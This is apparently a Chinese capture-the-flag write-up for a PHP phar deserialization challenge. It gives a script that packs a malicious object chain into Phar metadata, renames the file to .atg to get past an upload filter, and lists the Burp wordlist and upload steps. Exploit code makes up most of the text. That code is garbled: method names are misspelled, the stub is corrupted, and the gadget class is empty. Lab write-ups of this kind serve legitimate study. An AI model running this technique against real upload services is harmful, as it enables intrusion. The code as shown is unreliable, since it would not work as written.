题解:
```
<?php
class yesterday{
	public $study;
	public function __construct(){
		$this->study=new today();
	}
}
class today{
	public $doing;
	public function __construct(){
		$this->doing=new future();
	}
}
class future{
	//_toString方法将在对象被当作字符串时触发
}
//创建恶意对象链
$y=new yesterday();
//创建Phar文件
@unlink("exploit.phar");
$phar=new Phar("exploit.phar");
$phar->starBuffering();
$phar->setStub("<?php __HALT_(OMPILER()); ?>");
//将恶意对象作为元数据
$phar->setMetadata($y);
$phar->adFromString("test.txt","text");
$phar->stopBuffering();
//将Phar文件重名名为其他扩展名，例如.atg
rename("exploit.phar","exploit.atg");
?>
```
其中的atg后缀由爆破得到，Burp爆破所需字典在`D:\hashcat-7.1.2\常见默认密码\SecLists-master\Discovery\Web-Content\web-extensions.txt(可以换成web-extensions-big.txt、raft-small/medium/large-extensions.txt、File-Extensions-Universal-SVNDigger-Project/这个是通用扩展名目录)`
1.生成本地恶意Phar,把上面代码保存为1.php
	`#`需要PHP环境,且关闭phar.readonly(避免PHP 8.3起弃用，用-d或phar.reaonly=0)
	`php -d phar.readonly=0 1.php`
2.成功生成exploit.phar后改为exploit.atg(Phar靠文件头识别，改名不影响解析)
3.上传exploit.atg成功后记
	上传路径uploads/exploit.atg
